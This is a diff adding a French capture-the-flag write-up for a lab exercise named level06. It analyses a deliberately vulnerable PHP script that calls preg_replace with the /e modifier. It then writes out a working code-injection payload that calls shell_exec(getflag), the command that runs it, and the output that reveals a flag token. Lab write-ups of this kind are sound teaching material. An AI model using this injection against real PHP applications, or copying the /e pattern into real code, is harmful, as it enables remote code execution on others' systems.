@@ -1,0 +1,35 @@
+Dans notre home nous voyons deux fichiers : un executable level06 et un fichier php level06.php
+
+Quand on affiche le fichier php : cat level06.php
+#!/usr/bin/php
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+Decomposons la fonction pour avoir une meilleure vue d'ensemble sur ce qui se passe : 
+<?php
+function y($m) { $m = preg_replace("/\./", " x ", $m);
+				 $m = preg_replace("/@/", " y", $m); 
+				 return $m; }
+function x($y, $z) { $a = file_get_contents($y); 
+					 $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
+					 $a = preg_replace("/\[/", "(", $a); 
+					 $a = preg_replace("/\]/", ")", $a); 
+					 return $a; }
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+Dans la fonction x nous remarquons la presence du modifier /e. Il est rare de regarder des vulnerabilites de la sorte en PHP mais en ce qui concerne le modifer /e il faut y preter attention tout de suite.
+Ce dernier va permettre d'executer la fonction ou le code present dans le deuxieme argument de la fonction. Il faut donc ici essayer d'integrer le binaire getflag et le faire matcher avec [x (.)]
+Afin d'executer le binaire nous pouvons nous servir de shell_exec ou de exec. Utilisons ici shell_exec qui va executer une commande via le Shell et retourner une string.
+Il faut pour cela mettre tout d'abord nous code dans un fichier qui sera ouvert par la fonction file_get_contents()
+
+echo [x {\${shell_exec(getflag)}}] > /tmp/exploit
+
+./level06 /tmp/exploit
+
+PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
+PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+ in /home/user/level06/level06.php(4) : regexp code on line 1
